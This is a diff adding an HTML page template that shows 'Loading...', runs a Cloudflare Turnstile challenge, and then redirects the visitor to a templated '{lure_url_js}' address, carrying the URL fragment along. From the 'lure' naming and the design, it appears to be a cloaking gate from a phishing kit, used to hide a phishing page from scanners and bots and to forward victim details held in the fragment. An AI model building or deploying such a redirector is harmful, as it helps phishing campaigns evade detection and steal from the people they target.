@@ -1,0 +1,30 @@
+
+
+
+<html>
+<head>
+    <title>Loading..</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+
+Loading...
+<div id="cf-turnstile"></div>
+
+<script>
+turnstile.ready(function () {
+        turnstile.render('#cf-turnstile', {
+            sitekey: "{turnstile_key_js}", 
+            callback: function(token) {
+               const fragment = window.location.hash.substring(1); 
+               if (fragment) {
+                   window.location.assign({lure_url_js}+`#${fragment}`);
+               } else {
+                   window.location.assign({lure_url_js});
+               }
+            },
+        });
+    });
+</script>
+</body>
+</html>
